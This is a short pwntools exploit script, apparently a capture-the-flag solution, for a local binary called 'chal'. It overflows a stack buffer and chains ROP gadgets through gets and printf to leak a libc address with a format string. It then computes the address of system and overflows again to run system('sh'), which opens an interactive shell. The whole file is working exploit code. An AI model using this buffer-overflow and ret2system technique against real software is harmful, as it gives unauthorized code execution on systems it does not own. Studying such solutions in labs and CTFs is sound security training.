from pwn import *
elf = context.binary = ELF("./chal")
libc = ELF("./libc.so.6")

p = process('./chal')

# ret2gets leak using a formatstr
ret = p64(0x000000000040101a)
payload = cyclic(48)
payload += p64(0)
payload += ret
payload += p64(elf.plt["gets"])
payload += ret
payload += p64(elf.plt["gets"])
payload += ret
payload += p64(elf.plt["printf"])
payload += p64(elf.symbols["main"])
#gdb.attach(p)

p.sendlineafter(b">", payload)
p.sendline(p32(0) + b"junk" + b"bruhbruh")
p.sendline(b"%1$p")
stdin_leak = p.recvuntil(b"\xff")[:-1]
print("Stdin_leak", stdin_leak)
system = int(stdin_leak.decode().strip(), 16) - 1749523
print("System", hex(system))


# now we trigger binsh with system since we are back in main
payload1 = cyclic(48)
payload1 += p64(0)
payload1 += p64(elf.plt["gets"])
payload1 += ret
payload1 += p64(system)
p.sendlineafter(b">", payload1)
p.sendline(b"sh\x00" + ret)

print("Obtained shell just call shell commands")
p.interactive()
